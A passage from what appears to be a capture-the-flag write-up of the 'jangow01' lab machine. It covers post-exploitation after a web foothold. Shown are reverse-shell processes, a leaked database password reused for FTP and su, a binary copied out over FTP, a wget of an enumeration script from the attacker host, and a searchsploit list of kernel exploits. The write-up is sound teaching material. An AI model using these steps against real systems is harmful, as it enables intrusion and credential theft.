+root      2000     1  0 09:13 ?        00:00:00 /usr/sbin/acpid
+root      2008     1  0 09:13 ?        00:00:00 /usr/lib/snapd/snapd
+root      2042     1  0 09:13 ?        00:00:00 /usr/lib/policykit-1/polkitd --n
+root      2055     1  0 09:13 ?        00:00:00 /sbin/mdadm --monitor --pid-file
+root      2583     1  0 09:13 ?        00:00:00 /sbin/dhclient -1 -v -pf /run/dh
+root      2667     1  0 09:13 ?        00:00:00 /usr/sbin/vsftpd /etc/vsftpd.con
+root      2677     1  0 09:13 ?        00:00:00 /sbin/iscsid
+root      2678     1  0 09:13 ?        00:00:00 /sbin/iscsid
+root      2735     1  0 09:13 tty1     00:00:00 /sbin/agetty --noclear tty1 linu
+mysql     2769     1  0 09:13 ?        00:00:03 /usr/sbin/mysqld
+root      2777     1  0 09:13 ?        00:00:00 /usr/sbin/sshd -D
+root      2786     1  0 09:13 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3044  2786  0 09:22 ?        00:00:02 /usr/sbin/apache2 -k start
+root      3102     2  0 09:22 ?        00:00:00 [kworker/u2:0]
+www-data  3127  2786  0 09:27 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  3133  2786  0 09:28 ?        00:00:01 /usr/sbin/apache2 -k start
+root      3138     2  0 09:28 ?        00:00:00 [kworker/0:0]
+www-data  3141  2786  0 09:28 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data  3145  2786  0 09:29 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3147  2786  0 09:29 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3234  2786  0 09:35 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3236  2786  0 09:35 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3237  2786  0 09:35 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data  3238  2786  0 09:35 ?        00:00:00 /usr/sbin/apache2 -k start
+root      3403     2  0 10:15 ?        00:00:00 [kworker/u2:1]
+www-data  3432  3044  0 10:24 ?        00:00:00 sh -c python3 -c &#39;import socket,
+www-data  3433  3432  0 10:24 ?        00:00:00 python3 -c import socket,os,pty;
+www-data  3434  3433  0 10:24 pts/0    00:00:00 /bin/sh
+www-data  3453  3145  0 10:27 ?        00:00:00 sh -c python3 -c &#39;import socket,
+www-data  3454  3453  0 10:27 ?        00:00:00 python3 -c import socket,os,pty;
+www-data  3455  3454  0 10:27 pts/1    00:00:00 /bin/sh
+www-data  3464  3455  0 10:32 pts/1    00:00:00 ps -ef</code></pre>
+<blockquote>
+<p>mysql access denied for credentials “desafio02:abygurl69”</p>
+</blockquote>
+<pre class="shell"><code>$ mysql -u desafio02 -p
+mysql -u desafio02 -p
+Enter password: abygurl69
+
+ERROR 1045 (28000): Access denied for user &#39;desafio02&#39;@&#39;localhost&#39; (using password: YES)</code></pre>
+<blockquote>
+<p>find writable files</p>
+</blockquote>
+<pre class="shell"><code>$ find / -writable -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null
+find / -writable -not -path &quot;/proc/*&quot; -not -path &quot;/run/*&quot; -not -path &quot;/snap/*&quot; -not -path &quot;/dev/*&quot; -not -path &quot;/sys/*&quot; 2&gt;/dev/null
+/lib/systemd/system/hostname.service
+/lib/systemd/system/mountnfs.service
+/lib/systemd/system/reboot.service
+/lib/systemd/system/cryptdisks-early.service
+/lib/systemd/system/motd.service
+/lib/systemd/system/mountkernfs.service
+/lib/systemd/system/mountall.service
+/lib/systemd/system/screen-cleanup.service
+/lib/systemd/system/bootlogs.service
+/lib/systemd/system/sendsigs.service
+/lib/systemd/system/rmnologin.service
+/lib/systemd/system/rcS.service
+/lib/systemd/system/halt.service
+/lib/systemd/system/lvm2.service
+/lib/systemd/system/fuse.service
+/lib/systemd/system/umountfs.service
+/lib/systemd/system/x11-common.service
+/lib/systemd/system/stop-bootlogd-single.service
+/lib/systemd/system/checkroot-bootclean.service
+/lib/systemd/system/mountall-bootclean.service
+/lib/systemd/system/bootlogd.service
+/lib/systemd/system/mountnfs-bootclean.service
+/lib/systemd/system/mountdevsubfs.service
+/lib/systemd/system/umountnfs.service
+/lib/systemd/system/rc.service
+/lib/systemd/system/checkroot.service
+/lib/systemd/system/hwclock.service
+/lib/systemd/system/umountroot.service
+/lib/systemd/system/cryptdisks.service
+/lib/systemd/system/checkfs.service
+/lib/systemd/system/bootmisc.service
+/lib/systemd/system/killprocs.service
+/lib/systemd/system/single.service
+/lib/systemd/system/stop-bootlogd.service
+/var/www/html/.backup
+/var/www/html/site
+/var/www/html/site/js
+/var/www/html/site/js/scripts.js
+/var/www/html/site/wordpress
+/var/www/html/site/wordpress/index.html
+/var/www/html/site/wordpress/config.php
+/var/www/html/site/index.html
+/var/www/html/site/assets
+/var/www/html/site/assets/favicon.ico
+/var/www/html/site/assets/img
+/var/www/html/site/assets/img/bg-masthead.jpg
+/var/www/html/site/assets/img/demo-image-02.jpg
+/var/www/html/site/assets/img/bg-signup.jpg
+/var/www/html/site/assets/img/ipad.png
+/var/www/html/site/assets/img/demo-image-01.jpg
+/var/www/html/site/busque.php
+/var/www/html/site/css
+/var/www/html/site/css/styles.css
+/var/lib/php/sessions
+/var/crash
+/var/tmp
+/var/cache/apache2/mod_cache_disk
+/var/lock
+/tmp
+/tmp/.X11-unix
+/tmp/.Test-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+/tmp/.ICE-unix</code></pre>
+<p>There is one “.backup” file.</p>
+<pre class="shell"><code>$ ls -la /var/www/html/.backup
+ls -la /var/www/html/.backup
+-rw-r--r-- 1 www-data www-data 336 Oct 31 19:36 /var/www/html/.backup
+$ cat /var/www/html/.backup
+cat /var/www/html/.backup
+$servername = &quot;localhost&quot;;
+$database = &quot;jangow01&quot;;
+$username = &quot;jangow01&quot;;
+$password = &quot;abygurl69&quot;;
+// Create connection
+$conn = mysqli_connect($servername, $username, $password, $database);
+// Check connection
+if (!$conn) {
+    die(&quot;Connection failed: &quot; . mysqli_connect_error());
+}
+echo &quot;Connected successfully&quot;;
+mysqli_close($conn);</code></pre>
+<figure>
+<img src="23.more-mysql-credentials.png" alt="" /><figcaption>23.more-mysql-credentials</figcaption>
+</figure>
+<p>Well, credentials <code>jangow01:abygurl69</code> fails.</p>
+<pre><code>mysql -u jangow01 -p abygurl69
+mysql -u root -p abygurl69
+
+mysql -ujangow01 -pabygurl69 -e &quot;show databases;&quot;
+
+mysql -ujangow01 -pabygurl69 -Djangow01 -e &#39;show databases;&#39;
+mysql -ujangow01 -panygirl69 -Djangow01 -e &#39;show databases;&#39;
+mysql -ujangow01 -panygirl69 -Djangow01 -e &#39;show tables;&#39;
+
+mysql -ujangow01 -panygirl69 -Djangow01
+mysql -ujangow01 -pabygurl69 -Djangow01
+
+mysql -uroot -pabygurl69 -Djangow01
+mysql -uroot -pabygurl69 -Djangow01 -e &#39;show databases;&#39;
+
+mysql -ujangow01 -pjangow01 -Djangow01</code></pre>
+<figure>
+<img src="24-failing-mysql-access.png" alt="" /><figcaption>24-failing-mysql-access</figcaption>
+</figure>
+<blockquote>
+<p>Looking for more backup files</p>
+</blockquote>
+<pre class="shell"><code>$ find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
+find / -type f -name &quot;*backup*&quot; 2&gt;/dev/null
+/lib/modules/4.4.0-31-generic/kernel/drivers/net/team/team_mode_activebackup.ko
+/lib/modules/4.4.0-31-generic/kernel/drivers/power/wm831x_backup.ko
+/script/backup
+/usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+/usr/src/linux-headers-4.4.0-31-generic/include/config/wm831x/backup.h
+/usr/src/linux-headers-4.4.0-31-generic/include/config/net/team/mode/activebackup.h
+/usr/share/man/man8/vgcfgbackup.8.gz
+/var/www/html/.backup
+$ ls -la /script/backup
+ls -la /script/backup
+-rwxr-xr-x 1 root root 14864 Jun 10  2021 /script/backup
+$ file /script/backup
+file /script/backup
+/script/backup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9669c33d8833b1466ca0358ddccb99ff8fdc8730, not stripped</code></pre>
+<figure>
+<img src="25.backup-file.png" alt="" /><figcaption>25.backup-file</figcaption>
+</figure>
+<p>This is an interesting file.</p>
+<p><code>strings /script/backup</code> hints towards a file named <code>backup.sh.x.c</code>. but this file does not exist.</p>
+<pre class="shell"><code>$ find / -type f -name &quot;backup.sh.x.c&quot; 2&gt;/dev/null
+find / -type f -name &quot;backup.sh.x.c&quot; 2&gt;/dev/null</code></pre>
+<p>While triying to run it and we see that it is looking for a file <code>/var/backups/backup.txt</code>.</p>
+<pre class="shell"><code>$ /script/backup
+/script/backup
+cat: /var/backups/backup.txt: No such file or directory</code></pre>
+<p>We cannot create that file.</p>
+<pre class="shell"><code>$ touch /var/backups/backup.txt
+touch /var/backups/backup.txt
+touch: cannot touch &#39;/var/backups/backup.txt&#39;: Permission denied</code></pre>
+<p>I can get this binary out and maybe study it in ghidra.</p>
+<figure>
+<img src="26.what-is-even-script-backup.png" alt="" /><figcaption>26.what-is-even-script-backup</figcaption>
+</figure>
+<blockquote>
+<p>wget just fails</p>
+</blockquote>
+<pre class="shell"><code>$ wget 192.168.56.70:80/lse.sh
+wget 192.168.56.70:80/lse.sh
+--2021-12-16 11:11:59--  http://192.168.56.70/lse.sh
+Connecting to 192.168.56.70:80... ^C
+</code></pre>
+<blockquote>
+<p>FTP jangow01:abygurl69 works.</p>
+</blockquote>
+<pre class="shell"><code>ftp -p $RHOST 21
+Connected to 192.168.56.118.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.118:f0c1s): jangow01
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||48962|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
+226 Directory send OK.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||21473|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:33 .
+drwxr-xr-x   14 0        0            4096 Jun 10  2021 ..
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
+226 Directory send OK.
+ftp&gt; ls -laR
+229 Entering Extended Passive Mode (|||42034|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:33 .
+drwxr-xr-x   14 0        0            4096 Jun 10  2021 ..
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
+226 Directory send OK.
+ftp&gt; cd html
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||27748|)
+150 Here comes the directory listing.
+drwxr-xr-x    6 33       33           4096 Dec 16 10:43 site
+226 Directory send OK.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||34303|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 .
+drwxr-xr-x    3 0        0            4096 Oct 31 19:33 ..
+-rw-r--r--    1 33       33            336 Oct 31 19:36 .backup
+drwxr-xr-x    6 33       33           4096 Dec 16 10:43 site
+226 Directory send OK.
+ftp&gt; cd site
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||41552|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 33       33           4096 Jun 03  2021 assets
+-rw-r--r--    1 33       33             35 Jun 10  2021 busque.php
+drwxr-xr-x    2 33       33           4096 Jun 03  2021 css
+-rw-r--r--    1 33       33          10190 Jun 10  2021 index.html
+drwxr-xr-x    2 33       33           4096 Jun 03  2021 js
+-rw-r--r--    1 33       33           1508 Dec 16 11:03 wget-log
+drwxr-xr-x    2 33       33           4096 Jun 10  2021 wordpress
+226 Directory send OK.
+ftp&gt; cd ..
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||16357|)
+150 Here comes the directory listing.
+drwxr-xr-x    6 33       33           4096 Dec 16 10:43 site
+226 Directory send OK.
+ftp&gt; ls -la
+229 Entering Extended Passive Mode (|||16207|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 .
+drwxr-xr-x    3 0        0            4096 Oct 31 19:33 ..
+-rw-r--r--    1 33       33            336 Oct 31 19:36 .backup
+drwxr-xr-x    6 33       33           4096 Dec 16 10:43 site
+226 Directory send OK.
+ftp&gt; cat .backup
+?Invalid command.
+ftp&gt; get .backup
+local: .backup remote: .backup
+229 Entering Extended Passive Mode (|||23093|)
+150 Opening BINARY mode data connection for .backup (336 bytes).
+100% |**********************************************************************|   336      274.12 KiB/s    00:00 ETA
+226 Transfer complete.
+336 bytes received in 00:00 (122.57 KiB/s)
+ftp&gt; exit
+221 Goodbye.</code></pre>
+<figure>
+<img src="27.ftp-access.png" alt="" /><figcaption>27.ftp-access</figcaption>
+</figure>
+<blockquote>
+<p>Getting /script/backup out of jangow via ftp</p>
+</blockquote>
+<pre class="shell"><code>$ cd html
+cd html
+$ cp /script/backup ./
+cp /script/backup ./
+cp: cannot create regular file &#39;./backup&#39;: Permission denied
+$ ls
+ls
+site
+$ ls -la
+ls -la
+total 16
+drwxr-xr-x 3 root     root     4096 Oct 31 19:36 .
+drwxr-xr-x 3 root     root     4096 Oct 31 19:33 ..
+-rw-r--r-- 1 www-data www-data  336 Oct 31 19:36 .backup
+drwxr-xr-x 6 www-data www-data 4096 Dec 16 10:43 site
+$ cd site
+cd site
+$ cp /script/backup ./
+cp /script/backup ./
+$ ls
+ls
+assets  backup  busque.php  css  index.html  js  wget-log  wordpress</code></pre>
+<pre class="shell"><code>ftp -p $RHOST 21                           
+Connected to 192.168.56.118.
+220 (vsFTPd 3.0.3)
+Name (192.168.56.118:f0c1s): jangow01
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||58677|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        0            4096 Oct 31 19:36 html
+226 Directory send OK.
+ftp&gt; cd html
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||8978|)
+150 Here comes the directory listing.
+drwxr-xr-x    6 33       33           4096 Dec 16 11:42 site
+226 Directory send OK.
+ftp&gt; cd site
+250 Directory successfully changed.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||14768|)
+150 Here comes the directory listing.
+drwxr-xr-x    3 33       33           4096 Jun 03  2021 assets
+-rwxr-xr-x    1 33       33          14864 Dec 16 11:42 backup
+-rw-r--r--    1 33       33             35 Jun 10  2021 busque.php
+drwxr-xr-x    2 33       33           4096 Jun 03  2021 css
+-rw-r--r--    1 33       33          10190 Jun 10  2021 index.html
+drwxr-xr-x    2 33       33           4096 Jun 03  2021 js
+-rw-r--r--    1 33       33           1508 Dec 16 11:03 wget-log
+drwxr-xr-x    2 33       33           4096 Jun 10  2021 wordpress
+226 Directory send OK.
+ftp&gt; get backup
+local: backup remote: backup
+229 Entering Extended Passive Mode (|||50938|)
+150 Opening BINARY mode data connection for backup (14864 bytes).
+100% |**********************************************************************| 14864      101.25 MiB/s    00:00 ETA
+226 Transfer complete.
+14864 bytes received in 00:00 (18.77 MiB/s)
+ftp&gt; exit
+421 Timeout.</code></pre>
+<figure>
+<img src="28.copy-script-backup-to-ftp-dir.png" alt="" /><figcaption>28.copy-script-backup-to-ftp-dir</figcaption>
+</figure>
+<figure>
+<img src="29.get-script-backup-via-ftp.png" alt="" /><figcaption>29.get-script-backup-via-ftp</figcaption>
+</figure>
+<blockquote>
+<p>ghidra</p>
+</blockquote>
+<div class="sourceCode" id="cb33"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true"></a>undefined8 main(undefined4 param_1,undefined8 *param_2)</span>
+<span id="cb33-2"><a href="#cb33-2" aria-hidden="true"></a></span>
+<span id="cb33-3"><a href="#cb33-3" aria-hidden="true"></a>{</span>
+<span id="cb33-4"><a href="#cb33-4" aria-hidden="true"></a>  undefined8 uVar1;</span>
+<span id="cb33-5"><a href="#cb33-5" aria-hidden="true"></a>  <span class="dt">int</span> *piVar2;</span>
+<span id="cb33-6"><a href="#cb33-6" aria-hidden="true"></a>  <span class="dt">char</span> *pcVar3;</span>
+<span id="cb33-7"><a href="#cb33-7" aria-hidden="true"></a>  undefined *puVar4;</span>
+<span id="cb33-8"><a href="#cb33-8" aria-hidden="true"></a>  <span class="dt">char</span> *pcVar5;</span>
+<span id="cb33-9"><a href="#cb33-9" aria-hidden="true"></a>  </span>
+<span id="cb33-10"><a href="#cb33-10" aria-hidden="true"></a>  uVar1 = xsh(param_1,param_2);</span>
+<span id="cb33-11"><a href="#cb33-11" aria-hidden="true"></a>  param_2[<span class="dv">1</span>] = uVar1;</span>
+<span id="cb33-12"><a href="#cb33-12" aria-hidden="true"></a>  <span class="cf">if</span> (param_2[<span class="dv">1</span>] == <span class="dv">0</span>) {</span>
+<span id="cb33-13"><a href="#cb33-13" aria-hidden="true"></a>    pcVar5 = <span class="st">&quot;&lt;null&gt;&quot;</span>;</span>
+<span id="cb33-14"><a href="#cb33-14" aria-hidden="true"></a>  }</span>
+<span id="cb33-15"><a href="#cb33-15" aria-hidden="true"></a>  <span class="cf">else</span> {</span>
+<span id="cb33-16"><a href="#cb33-16" aria-hidden="true"></a>    pcVar5 = (<span class="dt">char</span> *)param_2[<span class="dv">1</span>];</span>
+<span id="cb33-17"><a href="#cb33-17" aria-hidden="true"></a>  }</span>
+<span id="cb33-18"><a href="#cb33-18" aria-hidden="true"></a>  piVar2 = __errno_location();</span>
+<span id="cb33-19"><a href="#cb33-19" aria-hidden="true"></a>  <span class="cf">if</span> (*piVar2 == <span class="dv">0</span>) {</span>
+<span id="cb33-20"><a href="#cb33-20" aria-hidden="true"></a>    pcVar3 = <span class="st">&quot;&quot;</span>;</span>
+<span id="cb33-21"><a href="#cb33-21" aria-hidden="true"></a>  }</span>
+<span id="cb33-22"><a href="#cb33-22" aria-hidden="true"></a>  <span class="cf">else</span> {</span>
+<span id="cb33-23"><a href="#cb33-23" aria-hidden="true"></a>    piVar2 = __errno_location();</span>
+<span id="cb33-24"><a href="#cb33-24" aria-hidden="true"></a>    pcVar3 = strerror(*piVar2);</span>
+<span id="cb33-25"><a href="#cb33-25" aria-hidden="true"></a>  }</span>
+<span id="cb33-26"><a href="#cb33-26" aria-hidden="true"></a>  piVar2 = __errno_location();</span>
+<span id="cb33-27"><a href="#cb33-27" aria-hidden="true"></a>  <span class="cf">if</span> (*piVar2 == <span class="dv">0</span>) {</span>
+<span id="cb33-28"><a href="#cb33-28" aria-hidden="true"></a>    puVar4 = &amp;DAT_0040164d;</span>
+<span id="cb33-29"><a href="#cb33-29" aria-hidden="true"></a>  }</span>
+<span id="cb33-30"><a href="#cb33-30" aria-hidden="true"></a>  <span class="cf">else</span> {</span>
+<span id="cb33-31"><a href="#cb33-31" aria-hidden="true"></a>    puVar4 = &amp;DAT_0040164e;</span>
+<span id="cb33-32"><a href="#cb33-32" aria-hidden="true"></a>  }</span>
+<span id="cb33-33"><a href="#cb33-33" aria-hidden="true"></a>  fprintf(stderr,<span class="st">&quot;%s%s%s: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,*param_2,puVar4,pcVar3,pcVar5);</span>
+<span id="cb33-34"><a href="#cb33-34" aria-hidden="true"></a>  <span class="cf">return</span> <span class="dv">1</span>;</span>
+<span id="cb33-35"><a href="#cb33-35" aria-hidden="true"></a>}</span></code></pre></div>
+<figure>
+<img src="30.ghidra-script-backup-main-function.png" alt="" /><figcaption>30.ghidra-script-backup-main-function</figcaption>
+</figure>
+<p>While looking for something, I realized I have a few credentials, may be I should try to become <code>jangow01</code>.</p>
+<blockquote>
+<p>login as jangow01</p>
+</blockquote>
+<pre class="shell"><code>$ su jangow01
+su jangow01
+Password: abygurl69
+
+jangow01@jangow01:/var/www/html/site$ whoami
+whoami
+jangow01
+jangow01@jangow01:/var/www/html/site$ sudo -l
+sudo -l
+sudo: não foi possível resolver máquina jangow01: Conexão recusada
+[sudo] senha para jangow01: jangow01
+
+Sinto muito, tente novamente.
+[sudo] senha para jangow01: abygurl69
+
+Sinto muito, usuário jangow01 não pode executar sudo em jangow01.
+</code></pre>
+<figure>
+<img src="31.login-as-jangow01.png" alt="" /><figcaption>31.login-as-jangow01</figcaption>
+</figure>
+<p>I don’t need to translate what it means. I bet it says user jangow01 cannot run as sudo.</p>
+<figure>
+<img src="32.cannot-run-sudo-as-jangow01.png" alt="" /><figcaption>32.cannot-run-sudo-as-jangow01</figcaption>
+</figure>
+<blockquote>
+<p>Badly failing at figuring out what to do next</p>
+</blockquote>
+<pre class="shell"><code>jangow01@jangow01:~$ ls -la
+ls -la
+total 36
+drwxr-xr-x 4 jangow01 desafio02 4096 Jun 10  2021 .
+drwxr-xr-x 3 root     root      4096 Out 31 19:04 ..
+-rw------- 1 jangow01 desafio02  200 Out 31 19:39 .bash_history
+-rw-r--r-- 1 jangow01 desafio02  220 Jun 10  2021 .bash_logout
+-rw-r--r-- 1 jangow01 desafio02 3771 Jun 10  2021 .bashrc
+drwx------ 2 jangow01 desafio02 4096 Jun 10  2021 .cache
+drwxrwxr-x 2 jangow01 desafio02 4096 Jun 10  2021 .nano
+-rw-r--r-- 1 jangow01 desafio02  655 Jun 10  2021 .profile
+-rw-r--r-- 1 jangow01 desafio02    0 Jun 10  2021 .sudo_as_admin_successful
+-rw-rw-r-- 1 jangow01 desafio02   33 Jun 10  2021 user.txt
+jangow01@jangow01:~$ cat .bash_history
+cat .bash_history
+sudo su
+ls /root/script
+sudo su
+ls /script
+cd /script
+./backup 
+ls -lsah
+exit
+sudo su
+sudo su
+su
+cd /var/www
+ls
+ls -la
+cd html
+ls
+ls -la
+nano /etc/apache2/sites-enabled/000-default.conf 
+su
+exit
+exit
+jangow01@jangow01:~$ sudo su
+sudo su
+sudo: não foi possível resolver máquina jangow01: Conexão recusada
+[sudo] senha para jangow01: desafio02
+
+Sinto muito, tente novamente.
+[sudo] senha para jangow01: abygurl69
+
+jangow01 não está no arquivo sudoers. Este incidente será relatado.
+jangow01@jangow01:~$ cat /etc/default/locale
+cat /etc/default/locale
+#  File generated by update-locale
+LANG=&quot;pt_BR.UTF-8&quot;
+LANGUAGE=&quot;pt_BR:pt:en&quot;
+LC_NUMERIC=&quot;pt_BR&quot;
+LC_TIME=&quot;pt_BR&quot;
+LC_MONETARY=&quot;pt_BR&quot;
+LC_PAPER=&quot;pt_BR&quot;
+LC_NAME=&quot;pt_BR&quot;
+LC_ADDRESS=&quot;pt_BR&quot;
+LC_TELEPHONE=&quot;pt_BR&quot;
+LC_MEASUREMENT=&quot;pt_BR&quot;
+LC_IDENTIFICATION=&quot;pt_BR&quot;
+jangow01@jangow01:~$ ls -la /etc/default/locale
+ls -la /etc/default/locale
+-rw-r--r-- 1 root root 254 Jun 10  2021 /etc/default/locale
+jangow01@jangow01:~$ cat .pam_environment
+cat .pam_environment
+cat: .pam_environment: Arquivo ou diretório não encontrado
+jangow01@jangow01:~$ ls -la .pam_environment
+ls -la .pam_environment
+ls: não é possível acessar &#39;.pam_environment&#39;: Arquivo ou diretório não encontrado
+jangow01@jangow01:~$ touch .pam_environment
+touch .pam_environment
+jangow01@jangow01:~$ echo &quot;LANG=en_US LANGUAGE=en_US&quot; &gt;&gt; .pam_environment
+echo &quot;LANG=en_US LANGUAGE=en_US&quot; &gt;&gt; .pam_environment
+jangow01@jangow01:~$ sudo su
+sudo su
+sudo: não foi possível resolver máquina jangow01: Conexão recusada
+[sudo] senha para jangow01: abygurl69
+
+jangow01 não está no arquivo sudoers. Este incidente será relatado.
+jangow01@jangow01:~$</code></pre>
+<p>The user jangow01 is not in sudoers list, and desafio02 has been removed from the system.</p>
+<blockquote>
+<p><code>cat .bash_history</code></p>
+</blockquote>
+<pre class="shell"><code>jangow01@jangow01:~$ cat .bash_history
+cat .bash_history
+sudo su
+ls /root/script
+sudo su
+ls /script
+cd /script
+./backup 
+ls -lsah
+exit
+sudo su
+sudo su
+su
+cd /var/www
+ls
+ls -la
+cd html
+ls
+ls -la
+nano /etc/apache2/sites-enabled/000-default.conf 
+su
+exit
+exit</code></pre>
+<p>Well, credentials seem to be useless from here…</p>
+<blockquote>
+<p>look for kernel bugs</p>
+</blockquote>
+<pre class="shell"><code>jangow01@jangow01:/var/www/html/site$ uname -a
+uname -a
+Linux jangow01 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+jangow01@jangow01:/var/www/html/site$ cat /etc/*-release
+cat /etc/*-release
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.1 LTS&quot;
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;16.04.1 LTS (Xenial Xerus)&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 16.04.1 LTS&quot;
+VERSION_ID=&quot;16.04&quot;
+HOME_URL=&quot;http://www.ubuntu.com/&quot;
+SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
+BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
+UBUNTU_CODENAME=xenial
+jangow01@jangow01:/var/www/html/site$</code></pre>
+<pre class="shell"><code>searchsploit linux kernel 4.4     
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel (Solaris 10 / &lt; 5.10 138888-01) - Local Privilege Escalation        | solaris/local/15962.c
+Linux Kernel 2.4.4 &lt; 2.4.37.4 / 2.6.0 &lt; 2.6.30.4 - &#39;Sendpage&#39; Local Privilege Es | linux/local/19933.rb
+Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 &lt; 11 / Whitebox 4 / CentOS  | linux/local/9479.c
+Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) | linux_x86/local/9542.c
+Linux Kernel 2.6.19 &lt; 5.9 - &#39;Netfilter Local Privilege Escalation                | linux/local/50135.c
+Linux Kernel 3.10/3.18 /4.4 - Netfilter IPT_SO_SET_REPLACE Memory Corruption     | linux/dos/39545.txt
+Linux Kernel 3.11 &lt; 4.8 0 - &#39;SO_SNDBUFFORCE&#39; / &#39;SO_RCVBUFFORCE&#39; Local Privilege  | linux/local/41995.c
+Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free             | linux/dos/43234.c
+Linux Kernel 4.4 (Ubuntu 16.04) - &#39;BPF&#39; Local Privilege Escalation (Metasploit)  | linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - &#39;snd_timer_user_ccallback()&#39; Kernel Pointer Le | linux/dos/46529.c
+Linux Kernel 4.4 - &#39;rtnetlink&#39; Stack Memory Disclosure                           | linux/local/46006.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - &#39;AF_PACKET&#39; Race Condition Priv | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                             | linux/dos/41457.c
+Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation              | linux/local/41458.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter &#39;target_offset&#39; Out-of-Boun | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - &#39;AF_PACKET&#39; Race Con | windows_x86-64/local/47170.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privileg | linux/local/39277.c
+Linux Kernel 4.4.1 - REFCOUNT Overflow Use-After-Free in Keyrings Local Privileg | linux/local/40003.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - &#39;double-fdput()&#39; bpf(BPF_PROG_LOAD) Privileg | linux/local/39772.txt
+Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                       | linux/local/41886.c
+Linux Kernel &lt; 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation        | arm/local/31574.c
+Linux Kernel &lt; 4.10.13 - &#39;keyctl_set_reqkey_keyring&#39; Local Denial of Service     | linux/dos/42136.c
+Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                     | linux/local/43345.c
+Linux Kernel &lt; 4.11.8 - &#39;mq_notify: double sock_put()&#39; Local Privilege Escalatio | linux/local/45553.c
+Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)                          | linux/dos/42762.txt
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation    | linux/local/45010.c
+Linux Kernel &lt; 4.14.rc3 - Local Denial of Service                                | linux/dos/42932.c
+Linux Kernel &lt; 4.15.4 - &#39;show_floppy&#39; KASLR Address Leak                         | linux/local/44325.c
+Linux Kernel &lt; 4.16.11 - &#39;ext4_read_inline_data()&#39; Memory Corruption             | linux/dos/44832.txt
+Linux Kernel &lt; 4.17-rc1 - &#39;AF_LLC&#39; Double Free                                   | linux/dos/44579.c
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation           | linux/local/44298.c
